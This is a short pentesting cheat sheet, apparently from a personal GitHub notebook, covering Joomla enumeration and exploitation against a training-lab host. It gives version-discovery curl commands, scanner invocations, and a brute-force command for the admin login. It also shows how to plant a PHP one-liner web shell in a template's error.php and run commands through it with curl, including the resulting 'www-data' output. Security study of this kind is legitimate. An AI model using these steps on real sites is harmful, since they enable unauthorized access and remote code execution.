## Enumeration 
#### source code, directories, files 
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool 
/robots.txt 
/README.txt
/administrator/manifests/files/joomla.xml
/plugins/system/cache/cache.xml
```

#### droopescan/joomlascan 
```
droopescan scan joomla --url <URL>
python2.7 joomlascan.py -u <URL>
```

#### bruteforce admin account 
```bash
# https://github.com/ajnik/joomla-bruteforce
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
<br>
<br>

## Attacking Joomla 
#### RCE via Admin Panel 
Admin panel has a built-in functionality in the Templates (Configuration -> Templates) 
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/44edad30-6365-403f-b887-1fa7e78a135b)

Pull up the templates menu 
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/0af0eed7-7f51-4f3f-81f0-47531988c0e9)

Customize a template (ex. protostar) select (error.php) 
add a PHP one-liner to gain code execution 
```bash
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/d48310b8-25e4-4125-a204-fed86893e2f0)

save & close template & execute rev shell w/ curl 
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

